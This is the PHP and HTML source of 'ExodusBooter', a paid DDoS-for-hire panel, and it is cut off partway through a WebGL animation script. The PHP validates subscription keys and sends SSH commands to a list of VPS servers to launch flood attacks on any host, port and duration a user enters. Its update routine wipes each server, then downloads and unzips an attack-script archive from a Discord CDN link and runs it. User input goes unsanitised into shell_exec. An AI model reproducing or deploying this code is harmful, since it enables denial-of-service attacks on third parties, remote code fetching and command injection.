<body style="background-color:black;">
<?php
ini_set("display_errors", 1);
ini_set("display_startup_errors", 1);
ini_set('default_socket_timeout', 2);
error_reporting(E_ERROR | E_PARSE);
$host = $_GET["host"];
$time = $_GET["time"];
$method = $_GET["method"];
$port = $_GET["port"];
$key = $_GET["key"];
$update = $_GET["update"];
$scripturl = "https://cdn.discordapp.com/attachments/1120800386870149141/1138027670408540291/mamata.zip";
$spoofedmethod = false;
require "servers.php";
require "methods.php";
/*
TODO:
- Add attack limit system so an api key can't just send 20mil attacks at a time
- Add proper support for spoofed servers
- Add script for easier VPS updating
- Recode the methods and servers system from php to json (would also solve the 2nd TODO)
*/
function SSH_execute($ip, $port, $user, $pass, $command)
{
    $connection = ssh2_connect("$ip", $port);
	if ($connection) {
		if (ssh2_auth_password($connection, "$user", "$pass")) {
			$stream = ssh2_exec($connection, "$command > /dev/null 2>&1 & ");
		}
		else {
			echo '<b style="color:white;">Error authenticating on Server ID ' . explode(".","$ip")[3] . '<br></b>';
		}
	}
	else 
	{
		echo '<b style="color:white;">Error connecting to Server ID ' . explode(".","$ip")[3] . '<br></b>';
	}
}

// Update Section Start
if (($update == "true" && $key == "da") ||($update == "true" && $key == "pulamica") ||($update == "true" && $key == "wixyhubabuba")) {
    foreach ($vpslist as $x) {
        list($ip, $user, $pass) = explode(":", $x);
        SSH_execute("$ip", 22, "$user", "$pass", "rm -rf *");
        SSH_execute("$ip", 22, "$user", "$pass", "wget -O minecraft.zip $scripturl");
        sleep(1);
        SSH_execute("$ip", 22, "$user", "$pass", "unzip minecraft.zip");
        SSH_execute("$ip", 22, "$user", "$pass", "chmod +x *");
        SSH_execute("$ip", 22, "$user", "$pass", "apt install -y python3-pip");
        sleep(1);
        SSH_execute("$ip", 22, "$user", "$pass", "pip3 install pysocks");
    }
    echo '<b style="color:white;">Successfully pushed update to servers!</b>';
    return;
}
// Update Section End

// Subscription Section Start
if (!file_exists("apikeys/$key")) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failkey.html");
    return;
    $path = "userlogs.txt";
    $file = fopen($path, "a");
    fwrite($file, "USER: " . $key . " STATUS: FAILED" . "\n");
    // SendLog("FAILED", $key);
    return;
}
$f = fopen("apikeys/$key", "r");
if ($f) {
    $contents = fread($f, filesize("apikeys/$key"));
    fclose($f);
    $datediff = strtotime($contents) - time();
    if (round($datediff / (60 * 60 * 24)) < 0) {
        $path = "userlogs.txt";
        $file = fopen($path, "a");
        fwrite($file, "USER: " . $key . " STATUS: FAILED" . "\n");
        // SendLog("FAILED", $key);
        echo "<title>ExodusBooter -- Error</title>";
        readfile("failkey.html");
        return;
    } else {
        $path = "userlogs.txt";
        $file = fopen($path, "a");
		fwrite($file, "USER: " . $key . " STATUS: SUCCESS (" . round($datediff / (60 * 60 * 24)) . ")" .  "\n");
        // SendLog("SUCCESS (" . round($datediff / (60 * 60 * 24)) . ")", $key);
        //echo round($datediff / (60 * 60 * 24));
    }
}

// Subscription Section End

// Attack Handling Section Start
if ($host == null && $method == null && $time == null) {
    echo "<title>ExodusBooter</title>";
    readfile("fail.html");
    return;
} elseif ($host == null) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failhost.html");
    return;
} elseif ($method == null) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failmethod.html");
    return;
} elseif ($port == null) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failport.html");
    return;
} elseif ($time == null) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failtime.html");
    return;
} elseif ($time > 300) {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failtime2.html");
    return;
} elseif (shell_exec("sudo screen -list | grep '$key'") != "") {
    echo "<title>ExodusBooter -- Error</title>";
    readfile("failkey2.html");
    return;
}
if ($method != null || $method != "") {
    if (array_search("$method", $methods, true) == null) {
        echo "<title>ExodusBooter -- Error</title>";
        readfile("failmethod.html");
        return;
    }
}
// Cooldown Section Start
if ($key == "smokimparatu56") {
    shell_exec("sudo screen -S $key -dmS timeout $time ping 1.1.1.1");
} elseif ($key == "kent8scurt") {
    shell_exec("sudo screen -S $key -dmS timeout $time ping 1.1.1.1");
} else {
    $timenormal = $time + 30;
    shell_exec("sudo screen -S $key -dmS timeout $timenormal ping 1.1.1.1");
}
// Cooldown Section End
echo "<title>ExodusBooter -- Success</title>";
$command = array_search("$method", $methods, true);
foreach ($vpslist as $x) {
    list($ip, $user, $pass) = explode(":", $x);
    SSH_execute("$ip", 22, "$user", "$pass", "sudo screen -S $key -dmS timeout $time $command");
    //SSH_execute("$ip", 22, "$user", "$pass", "wget https://cdn.discordapp.com/attachments/1120800386870149141/1137846441834991746/teste.zip"); SSH_execute("$ip", 22, "$user", "$pass", "unzip teste.zip"); // add scripts owo
    //SSH_execute("$ip", 22, "$user", "$pass", "rm -rf *"); //clear shit
}
// Attack Handling Section End
?>

<html><head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
<style>
    p {
}
font-size: 40px;
margin:0;
letter-spacing:3px;
    }
</style>
<script data-dapp-detection="">
(function() {
  let alreadyInsertedMetaTag = false

  function __insertDappDetected() {
    if (!alreadyInsertedMetaTag) {
      const meta = document.createElement('meta')
      meta.name = 'dapp-detected'
      document.head.appendChild(meta)
      alreadyInsertedMetaTag = true
    }
  }

  if (window.hasOwnProperty('web3')) {
    // Note a closure can't be used for this var because some sites like
    // www.wnyc.org do a second script execution via eval for some reason.
    window.__disableDappDetectionInsertion = true
    // Likely oldWeb3 is undefined and it has a property only because
    // we defined it. Some sites like wnyc.org are evaling all scripts
    // that exist again, so this is protection against multiple calls.
    if (window.web3 === undefined) {
      return
    }
    __insertDappDetected()
  } else {
    var oldWeb3 = window.web3
    Object.defineProperty(window, 'web3', {
      configurable: true,
      set: function (val) {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        oldWeb3 = val
      },
      get: function () {
        if (!window.__disableDappDetectionInsertion)
          __insertDappDetected()
        return oldWeb3
      }
    })
  }
})()</script></head>
<body oncontextmenu="if (!window.__cfRLUnblockHandlers) return false; return false;" unselectable="on" onselectstart="if (!window.__cfRLUnblockHandlers) return false; return false;"><canvas width="1256" height="973"></canvas>
<style>
* {
    cursor: url(https://nafriklopper.club/cursor.cur) !important;
}
        </style>
		
		<iframe src="mosey.mp3" allow="autoplay" style="display:none"></iframe>
        <audio autoplay="" loop="">
            <script>
                var audio = document.currentScript.parentElement;
                audio.volume = 0.1;
            </script>
        </audio>
<script type="text/javascript">
    window.onkeydown = function(evt) {
        if(evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 17 || evt.keyCode == 16 || evt.keyCode == 74 || evt.keyCode == 116 || evt.keyCode == 73 || evt.keyCode == 8 || evt.KeyCode == 13 || evt.KeyCode == 16 || evt.KeyCode == 17 || evt.KeyCode == 83) return false;
e.preventDefault();
    };

    window.onkeypress = function(evt) {
        if(evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 17 || evt.keyCode == 16 || evt.keyCode == 74 || evt.keyCode == 116 || evt.keyCode == 73 || evt.keyCode == 8 || evt.KeyCode == 13 || evt.KeyCode == 16 || evt.KeyCode == 17 || evt.KeyCode == 83) return false;
    
e.preventDefault();
    };

    window.onkeyup = function(evt) {
        if(evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 17 || evt.keyCode == 16 || evt.keyCode == 74 || evt.keyCode == 116 || evt.keyCode == 73 || evt.keyCode == 8 || evt.KeyCode == 13 || evt.KeyCode == 16 || evt.KeyCode == 17 || evt.KeyCode == 83) return false;
    document.onkeydown = function (e) {
    e = e || window.event;
    if (e.ctrlKey) {
        var c = e.which || e.keyCode;
        switch (c) {
            case 83://Block Ctrl+S
            case 87://Block Ctrl+W
                e.preventDefault();     
                e.stopPropagation();
            break;
        }
    }
};
    };
  
function disableF5(e) { if ((e.which || e.keyCode) == 116) e.preventDefault(); };
$(document).on("keydown", disableF5);
</script>
<style>
a {
color: inherit;
    text-decoration: none !important;
}

@keyframes fadein-text {
    from { 
		text-shadow: 2px 2px 0px black;
		opacity: 0; 
	}
    to { 
		text-shadow: 2px 2px 20px black;
		opacity: 1; 
	}
}

@keyframes fadein {
    from { 
		-webkit-filter: drop-shadow(0px 0px 5px rgba(0,0,0,0));
		opacity: 0; 
	}
    to { 
		-webkit-filter: drop-shadow(0px 0px 20px rgba(0,0,0,0.8));
		opacity: 1; 
	}
}
canvas {
  display: block;
  vertical-align: bottom;
}
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 1s
}

@-webkit-keyframes animatebottom {
  from { bottom:-100px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
  from{ bottom:-100px; opacity:0 } 
  to{ bottom:0; opacity:1 }
}
#minden {
  display: none;
  text-align: center;
}
#loader {
  position: absolute;
  left: 50%;
  top: 50%;
  z-index: 1;
  width: 50px;
  height: 50px;
  margin: -75px 0 0 -75px;
  border: 16px solid #000000;
  border-radius: 50%;
  border-top: 16px solid #FF0000;
  border-bottom: 16px solid #FF0000;
  width: 120px;
  height: 120px;
  -webkit-animation: spin 2s linear infinite;
  animation: spin 2s linear infinite;
}
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
#particles-js {
  position: absolute;
  width: 100%;
  height: 100%;
  z-index:-1;
}   

.center {
font-family: 'Montserrat', sans-serif;


  position: fixed; /* or absolute */
  top: 50%;
  left: 50%;
  /* bring your own prefixes */
  transform: translate(-50%, -50%);
      animation: fadein 3s;
    -moz-animation: fadein 3s; /* Firefox */
    -webkit-animation: fadein 3s; /* Safari and Chrome */
    -o-animation: fadein 3s; /* Opera */
}

@keyframes fadein {
    from {
        opacity:0;
    }
    to {
        opacity:1;
    }
}
@-moz-keyframes fadein {
    from {
        opacity:0;
    }
    to {
        opacity:1;
    }
}
@-webkit-keyframes fadein {
    from {
        opacity:0;
    }
    to {
        opacity:1;
    }
}
@-o-keyframes fadein {
    from {
        opacity:0;
    }
    to {
        opacity: 1;
    }
}
a:hover {
 cursor: url(https://nafriklopper.club/cursor_hover.cur) !important;
}
</style>
<div id="particles-js"></div>
<div class="center">
<center>
<pre>    
<img src="">
</pre>
<p id="dcheck"></p>
<div style="letter-spacing: 3;font-size: 15;"><div id="center">
<div class="animated fadeInDown">
</div>
<div class="animated fadeInUp">
<pre><pre align="middle">    
<a style="color:#FF0000;" tppabs="#" target="_self">Attack Started!</a></pre>
<p style="color:#FF0000;">IP: <?php echo $host; ?></p></pre>
<p style="color:#FF0000;">PORT: <?php echo $port; ?></p></pre>
<p style="color:#FF0000;">TIME: <?php echo $time; ?></p></pre>
<p style="color:#FF0000;">METHOD: <?php echo strtoupper(strtolower($method)); ?></p></pre>

</div>
<style>
html, body {
  overflow: hidden;
  color: #ffffff;
}
body {
  margin: 0;
  position: absolute;
  width: 100%;
  height: 100%;
}
canvas {
  width: 100%;
  height: 100%;
  z-index: -999999999;
}
[class^="letter"] {
  -webkit-transition: opacity 3s ease;
  -moz-transition: opacity 3s ease;
  transition: opacity 3s ease;
}
.letter-0 {
  transition-delay: 0.2s;
}
.letter-1 {
  transition-delay: 0.4s;
}
.letter-2 {
  transition-delay: 0.6s;
}
.letter-3 {
  transition-delay: 0.8s;
}
.letter-4 {
  transition-delay: 1.0s;
}
.letter-5 {
  transition-delay: 1.2s;
}
.letter-6 {
  transition-delay: 1.4s;
}
.letter-7 {
  transition-delay: 1.6s;
}
.letter-8 {
  transition-delay: 1.8s;
}
.letter-9 {
  transition-delay: 2.0s;
}
.letter-10 {
  transition-delay: 2.2s;
}
.letter-11 {
  transition-delay: 2.4s;
}
.letter-12 {
  transition-delay: 2.6s;
}
.letter-13 {
  transition-delay: 2.8s;
}
.letter-14 {
  transition-delay: 3.0s;
}
.letter-15 {
  transition-delay: 3.2s;
}
</style>
<script src="main.js"></script>
<script src="protection.js"></script>
<script src="title.js"></script>
<script src="app.js"></script>
<script src="particles.js"></script>
<script type="text/javascript">
'use strict';

var canvas = document.getElementsByTagName( 'canvas' )[ 0 ];

canvas.width  = canvas.clientWidth;
canvas.height = canvas.clientHeight;

var config = {
    TEXTURE_DOWNSAMPLE: 1,
    DENSITY_DISSIPATION: 0.98,
    VELOCITY_DISSIPATION: 0.99,
    PRESSURE_DISSIPATION: 0.8,
    PRESSURE_ITERATIONS: 25,
    CURL: 30,
    SPLAT_RADIUS: 0.005
};

var pointers   = [];
var splatStack = [];

var _getWebGLContext     = getWebGLContext( canvas );
var gl                   = _getWebGLContext.gl;
var ext                  = _getWebGLContext.ext;
var support_linear_float = _getWebGLContext.support_linear_float;

function getWebGLContext( canvas ) {

    var params = {
        alpha: false,
        depth: false,
        stencil: false,
        antialias: false
    };

    var gl = canvas.getContext( 'webgl2', params );

    var isWebGL2 = !!gl;

    if ( !isWebGL2 ) gl = canvas.getContext( 'webgl', params ) || canvas.getContext( 'experimental-webgl', params );

    var halfFloat            = gl.getExtension( 'OES_texture_half_float' );
    var support_linear_float = gl.getExtension( 'OES_texture_half_float_linear' );

    if ( isWebGL2 ) {
        gl.getExtension( 'EXT_color_buffer_float' );
        support_linear_float = gl.getExtension( 'OES_texture_float_linear' );
    }

    gl.clearColor( 0.0, 0.0, 0.0, 1.0 );

    var internalFormat   = isWebGL2 ? gl.RGBA16F : gl.RGBA;
    var internalFormatRG = isWebGL2 ? gl.RG16F : gl.RGBA;
    var formatRG         = isWebGL2 ? gl.RG : gl.RGBA;
    var texType          = isWebGL2 ? gl.HALF_FLOAT : halfFloat.HALF_FLOAT_OES;

    return {
        gl: gl,
        ext: {
            internalFormat: internalFormat,
            internalFormatRG: internalFormatRG,
            formatRG: formatRG,
            texType: texType
        },
        support_linear_float: support_linear_float
    };
}

function pointerPrototype() {
    this.id    = -1;
    this.x     = 0;
    this.y     = 0;
    this.dx    = 0;
    this.dy    = 0;
    this.down  = false;
    this.moved = false;
    this.color = [ 30, 0, 300 ];
}

pointers.push( new pointerPrototype() );

var GLProgram = function () {
    
    function GLProgram( vertexShader, fragmentShader ) {

        if ( !(this instanceof GLProgram) )
            throw new TypeError( "Cannot call a class as a function" );

        this.uniforms = {};
        this.program  = gl.createProgram();

        gl.attachShader( this.program, vertexShader );
        gl.attachShader( this.program, fragmentShader );
        gl.linkProgram( this.program );

        if ( !gl.getProgramParameter( this.program, gl.LINK_STATUS ) ) throw gl.getProgramInfoLog( this.program );

        var uniformCount = gl.getProgramParameter( this.program, gl.ACTIVE_UNIFORMS );
        
        for ( var i = 0; i < uniformCount; i++ ) {
            
            var uniformName = gl.getActiveUniform( this.program, i ).name;
            
            this.uniforms[ uniformName ] = gl.getUniformLocation( this.program, uniformName );
            
        }
    }

    GLProgram.prototype.bind = function bind() {
        gl.useProgram( this.program );
    };

    return GLProgram;
    
}();

function compileShader( type, source ) {

    var shader = gl.createShader( type );
    
    gl.shaderSource( shader, source );
    gl.compileShader( shader );

    if ( !gl.getShaderParameter( shader, gl.COMPILE_STATUS ) ) throw gl.getShaderInfoLog( shader );

    return shader;

}

var baseVertexShader               = compileShader( gl.VERTEX_SHADER, 'precision highp float; precision mediump sampler2D; attribute vec2 aPosition; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform vec2 texelSize; void main () {     vUv = aPosition * 0.5 + 0.5;     vL = vUv - vec2(texelSize.x, 0.0);     vR = vUv + vec2(texelSize.x, 0.0);     vT = vUv + vec2(0.0, texelSize.y);     vB = vUv - vec2(0.0, texelSize.y);     gl_Position = vec4(aPosition, 0.0, 1.0); }' );
var clearShader                    = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; uniform sampler2D uTexture; uniform float value; void main () {     gl_FragColor = value * texture2D(uTexture, vUv); }' );
var displayShader                  = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; uniform sampler2D uTexture; void main () {     gl_FragColor = texture2D(uTexture, vUv); }' );
var splatShader                    = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; uniform sampler2D uTarget; uniform float aspectRatio; uniform vec3 color; uniform vec2 point; uniform float radius; void main () {     vec2 p = vUv - point.xy;     p.x *= aspectRatio;     vec3 splat = exp(-dot(p, p) / radius) * color;     vec3 base = texture2D(uTarget, vUv).xyz;     gl_FragColor = vec4(base + splat, 1.0); }' );
var advectionManualFilteringShader = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; uniform sampler2D uVelocity; uniform sampler2D uSource; uniform vec2 texelSize; uniform float dt; uniform float dissipation; vec4 bilerp (in sampler2D sam, in vec2 p) {     vec4 st;     st.xy = floor(p - 0.5) + 0.5;     st.zw = st.xy + 1.0;     vec4 uv = st * texelSize.xyxy;     vec4 a = texture2D(sam, uv.xy);     vec4 b = texture2D(sam, uv.zy);     vec4 c = texture2D(sam, uv.xw);     vec4 d = texture2D(sam, uv.zw);     vec2 f = p - st.xy;     return mix(mix(a, b, f.x), mix(c, d, f.x), f.y); } void main () {     vec2 coord = gl_FragCoord.xy - dt * texture2D(uVelocity, vUv).xy;     gl_FragColor = dissipation * bilerp(uSource, coord);     gl_FragColor.a = 1.0; }' );
var advectionShader                = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; uniform sampler2D uVelocity; uniform sampler2D uSource; uniform vec2 texelSize; uniform float dt; uniform float dissipation; void main () {     vec2 coord = vUv - dt * texture2D(uVelocity, vUv).xy * texelSize;     gl_FragColor = dissipation * texture2D(uSource, coord); }' );
var divergenceShader               = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform sampler2D uVelocity; vec2 sampleVelocity (in vec2 uv) {     vec2 multiplier = vec2(1.0, 1.0);     if (uv.x < 0.0) { uv.x = 0.0; multiplier.x = -1.0; }     if (uv.x > 1.0) { uv.x = 1.0; multiplier.x = -1.0; }     if (uv.y < 0.0) { uv.y = 0.0; multiplier.y = -1.0; }     if (uv.y > 1.0) { uv.y = 1.0; multiplier.y = -1.0; }     return multiplier * texture2D(uVelocity, uv).xy; } void main () {     float L = sampleVelocity(vL).x;     float R = sampleVelocity(vR).x;     float T = sampleVelocity(vT).y;     float B = sampleVelocity(vB).y;     float div = 0.5 * (R - L + T - B);     gl_FragColor = vec4(div, 0.0, 0.0, 1.0); }' );
var curlShader                     = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform sampler2D uVelocity; void main () {     float L = texture2D(uVelocity, vL).y;     float R = texture2D(uVelocity, vR).y;     float T = texture2D(uVelocity, vT).x;     float B = texture2D(uVelocity, vB).x;     float vorticity = R - L - T + B;     gl_FragColor = vec4(vorticity, 0.0, 0.0, 1.0); }' );
var vorticityShader                = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform sampler2D uVelocity; uniform sampler2D uCurl; uniform float curl; uniform float dt; void main () {     float L = texture2D(uCurl, vL).y;     float R = texture2D(uCurl, vR).y;     float T = texture2D(uCurl, vT).x;     float B = texture2D(uCurl, vB).x;     float C = texture2D(uCurl, vUv).x;     vec2 force = vec2(abs(T) - abs(B), abs(R) - abs(L));     force *= 1.0 / length(force + 0.00001) * curl * C;     vec2 vel = texture2D(uVelocity, vUv).xy;     gl_FragColor = vec4(vel + force * dt, 0.0, 1.0); }' );
var pressureShader                 = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform sampler2D uPressure; uniform sampler2D uDivergence; vec2 boundary (in vec2 uv) {     uv = min(max(uv, 0.0), 1.0);     return uv; } void main () {     float L = texture2D(uPressure, boundary(vL)).x;     float R = texture2D(uPressure, boundary(vR)).x;     float T = texture2D(uPressure, boundary(vT)).x;     float B = texture2D(uPressure, boundary(vB)).x;     float C = texture2D(uPressure, vUv).x;     float divergence = texture2D(uDivergence, vUv).x;     float pressure = (L + R + B + T - divergence) * 0.25;     gl_FragColor = vec4(pressure, 0.0, 0.0, 1.0); }' );
var gradientSubtractShader         = compileShader( gl.FRAGMENT_SHADER, 'precision highp float; precision mediump sampler2D; varying vec2 vUv; varying vec2 vL; varying vec2 vR; varying vec2 vT; varying vec2 vB; uniform sampler2D uPressure; uniform sampler2D uVelocity; vec2 boundary (in vec2 uv) {     uv = min(max(uv, 0.0), 1.0);     return uv; } void main () {     float L = texture2D(uPressure, boundary(vL)).x;     float R = texture2D(uPressure, boundary(vR)).x;     float T = texture2D(uPressure, boundary(vT)).x;     float B = texture2D(uPressure, boundary(vB)).x;     vec2 velocity = texture2D(uVelocity, vUv).xy;     velocity.xy -= vec2(R - L, T - B);     gl_FragColor = vec4(velocity, 0.0, 1.0); }' );

var textureWidth  = void 0;
var textureHeight = void 0;
var density       = void 0;
var velocity      = void 0;
var divergence    = void 0;
var curl          = void 0;
var pressure      = void 0;

initFramebuffers();

var clearProgram           = new GLProgram( baseVertexShader, clearShader );
var displayProgram         = new GLProgram( baseVertexShader, displayShader );
var splatProgram           = new GLProgram( baseVertexShader, splatShader );
var advectionProgram       = new GLProgram( baseVertexShader, support_linear_float ? advectionShader : advectionManualFilteringShader );
var divergenceProgram      = new GLProgram( baseVertexShader, divergenceShader );
var curlProgram            = new GLProgram( baseVertexShader, curlShader );
var vorticityProgram       = new GLProgram( baseVertexShader, vorticityShader );
var pressureProgram        = new GLProgram( baseVertexShader, pressureShader );
var gradienSubtractProgram = new GLProgram( baseVertexShader, gradientSubtractShader );

function initFramebuffers() {

    textureWidth  = gl.drawingBufferWidth >> config.TEXTURE_DOWNSAMPLE;
    textureHeight = gl.drawingBufferHeight >> config.TEXTURE_DOWNSAMPLE;

    var iFormat   = ext.internalFormat;
    var iFormatRG = ext.internalFormatRG;
    var formatRG  = ext.formatRG;
    var texType   = ext.texType;

    density    = createDoubleFBO( 0, textureWidth, textureHeight, iFormat, gl.RGBA, texType, support_linear_float ? gl.LINEAR : gl.NEAREST );
    velocity   = createDoubleFBO( 2, textureWidth, textureHeight, iFormatRG, formatRG, texType, support_linear_float ? gl.LINEAR : gl.NEAREST );
    divergence = createFBO( 4, textureWidth, textureHeight, iFormatRG, formatRG, texType, gl.NEAREST );
    curl       = createFBO( 5, textureWidth, textureHeight, iFormatRG, formatRG, texType, gl.NEAREST );
    pressure   = createDoubleFBO( 6, textureWidth, textureHeight, iFormatRG, formatRG, texType, gl.NEAREST );

}

function createFBO( texId, w, h, internalFormat, format, type, param ) {

    gl.activeTexture( gl.TEXTURE0 + texId );

    var texture = gl.createTexture();

    gl.bindTexture( gl.TEXTURE_2D, texture );
    gl.texParameteri( gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, param );
    gl.texParameteri( gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, param );
    gl.texParameteri( gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE );
    gl.texParameteri( gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE );
    gl.texImage2D( gl.TEXTURE_2D, 0, internalFormat, w, h, 0, format, type, null );

    var fbo = gl.createFramebuffer();

    gl.bindFramebuffer( gl.FRAMEBUFFER, fbo );
    gl.framebufferTexture2D( gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texture, 0 );
    gl.viewport( 0, 0, w, h );
    gl.clear( gl.COLOR_BUFFER_BIT );

    return [ texture, fbo, texId ];

}

function createDoubleFBO( texId, w, h, internalFormat, format, type, param ) {

    var fbo1 = createFBO( texId, w, h, internalFormat, format, type, param );
    var fbo2 = createFBO( texId + 1, w, h, internalFormat, format, type, param );

    return {
        get first() {
            return fbo1;
        },
        get second() {
            return fbo2;
        },
        swap: function swap() {
            var temp = fbo1;

            fbo1 = fbo2;
            fbo2 = temp;
        }
    };

}

var blit = function () {

    gl.bindBuffer( gl.ARRAY_BUFFER, gl.createBuffer() );
    gl.bufferData( gl.ARRAY_BUFFER, new Float32Array( [ -1, -1, -1, 1, 1, 1, 1, -1 ] ), gl.STATIC_DRAW );
    gl.bindBuffer( gl.ELEMENT_ARRAY_BUFFER, gl.createBuffer() );
    gl.bufferData( gl.ELEMENT_ARRAY_BUFFER, new Uint16Array( [ 0, 1, 2, 0, 2, 3 ] ), gl.STATIC_DRAW );
    gl.vertexAttribPointer( 0, 2, gl.FLOAT, false, 0, 0 );
    gl.enableVertexAttribArray( 0 );

    return function ( destination ) {
        gl.bindFramebuffer( gl.FRAMEBUFFER, destination );
        gl.drawElements( gl.TRIANGLES, 6, gl.UNSIGNED_SHORT, 0 );
    };

}();

var lastTime = Date.now();

update();

function update() {

    resizeCanvas();

    var dt = Math.min( (Date.now() - lastTime) / 1000, 0.016 );
    lastTime = Date.now();

    gl.viewport( 0, 0, textureWidth, textureHeight );

    if ( splatStack.length > 0 ) {
        for ( var m = 0; m < splatStack.pop(); m++ ) {

            var color = [ Math.random() * 10, Math.random() * 10, Math.random() * 10 ];
            var x     = canvas.width * Math.random();
            var y     = canvas.height * Math.random();
            var dx    = 1000 * (Math.random() - 0.5);
            var dy    = 1000 * (Math.random() - 0.5);

            splat( x, y, dx, dy, color );
        }
    }

    advectionProgram.bind();
    gl.uniform2f( advectionProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( advectionProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    gl.uniform1i( advectionProgram.uniforms.uSource, velocity.first[ 2 ] );
    gl.uniform1f( advectionProgram.uniforms.dt, dt );
    gl.uniform1f( advectionProgram.uniforms.dissipation, config.VELOCITY_DISSIPATION );
    blit( velocity.second[ 1 ] );
    velocity.swap();

    gl.uniform1i( advectionProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    gl.uniform1i( advectionProgram.uniforms.uSource, density.first[ 2 ] );
    gl.uniform1f( advectionProgram.uniforms.dissipation, config.DENSITY_DISSIPATION );
    blit( density.second[ 1 ] );
    density.swap();

    for ( var i = 0, len =  pointers.length; i < len; i++ ) {
        var pointer = pointers[ i ];

        if ( pointer.moved ) {
            splat( pointer.x, pointer.y, pointer.dx, pointer.dy, pointer.color );
            pointer.moved = false;
        }
    }

    curlProgram.bind();
    gl.uniform2f( curlProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( curlProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    blit( curl[ 1 ] );

    vorticityProgram.bind();
    gl.uniform2f( vorticityProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( vorticityProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    gl.uniform1i( vorticityProgram.uniforms.uCurl, curl[ 2 ] );
    gl.uniform1f( vorticityProgram.uniforms.curl, config.CURL );
    gl.uniform1f( vorticityProgram.uniforms.dt, dt );
    blit( velocity.second[ 1 ] );
    velocity.swap();

    divergenceProgram.bind();
    gl.uniform2f( divergenceProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( divergenceProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    blit( divergence[ 1 ] );

    clearProgram.bind();

    var pressureTexId = pressure.first[ 2 ];

    gl.activeTexture( gl.TEXTURE0 + pressureTexId );
    gl.bindTexture( gl.TEXTURE_2D, pressure.first[ 0 ] );
    gl.uniform1i( clearProgram.uniforms.uTexture, pressureTexId );
    gl.uniform1f( clearProgram.uniforms.value, config.PRESSURE_DISSIPATION );
    blit( pressure.second[ 1 ] );
    pressure.swap();

    pressureProgram.bind();
    gl.uniform2f( pressureProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( pressureProgram.uniforms.uDivergence, divergence[ 2 ] );
    pressureTexId = pressure.first[ 2 ];
    gl.activeTexture( gl.TEXTURE0 + pressureTexId );

    for ( var _i = 0; _i < config.PRESSURE_ITERATIONS; _i++ ) {
        gl.bindTexture( gl.TEXTURE_2D, pressure.first[ 0 ] );
        gl.uniform1i( pressureProgram.uniforms.uPressure, pressureTexId );
        blit( pressure.second[ 1 ] );
        pressure.swap();
    }

    gradienSubtractProgram.bind();
    gl.uniform2f( gradienSubtractProgram.uniforms.texelSize, 1.0 / textureWidth, 1.0 / textureHeight );
    gl.uniform1i( gradienSubtractProgram.uniforms.uPressure, pressure.first[ 2 ] );
    gl.uniform1i( gradienSubtractProgram.uniforms.uVelocity, velocity.first[ 2 ] );
    blit( velocity.second[ 1 ] );
    velocity.swap();

    gl.viewport( 0, 0, gl.drawingBufferWidth, gl.drawingBufferHeight );
    displayProgram.bind();
    gl.uniform1i( displayProgram.uniforms.uTexture, density.first[ 2 ] );
    blit( null );

    requestAnimationFrame( update );

}

function splat( x, y, dx, dy, color ) {

    splatProgram.bind();
    gl.uniform1i( splatProgram.uniforms.uTarget, velocity.first[ 2 ] );
    gl.uniform1f( splatProgram.uniforms.aspectRatio, canvas.width / canvas.height );
